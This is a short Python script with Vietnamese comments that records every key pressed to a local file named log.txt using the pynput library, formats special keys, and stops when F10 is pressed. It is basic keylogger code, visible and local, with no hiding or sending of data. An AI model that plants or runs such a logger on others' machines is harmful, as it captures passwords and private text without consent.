from pynput import keyboard

def keypress(key):
    # Chuyển đổi key thành chuỗi để kiểm tra dễ dàng hơn
    key_str = str(key)
    
    # Cách chuẩn để dừng Listener trong pynput là trả về False
    if key_str == "Key.f10":
        print("\n[Đang dừng chương trình...]")
        return False  
    
    # Sử dụng cấu trúc 'with' để quản lý file an toàn hơn
    try:
        with open('log.txt', 'a', encoding='utf8') as f:
            # Xử lý định dạng hiển thị cho các phím đặc biệt (ví dụ: Key.space)
            if key_str.startswith("Key."):
                f.write(f" [{key_str.split('.')[1]}] ")
            else:
                # Loại bỏ dấu nháy đơn xung quanh ký tự thông thường (ví dụ: 'a' thành a)
                f.write(key_str.replace("'", ""))
    except Exception as e:
        print(f"Lỗi ghi file: {e}")

# Khởi chạy bộ lắng nghe sự kiện từ bàn phím
with keyboard.Listener(on_press=keypress) as obj:
    print("Chương trình đang chạy... Nhấn F10 để thoát.")
    obj.join()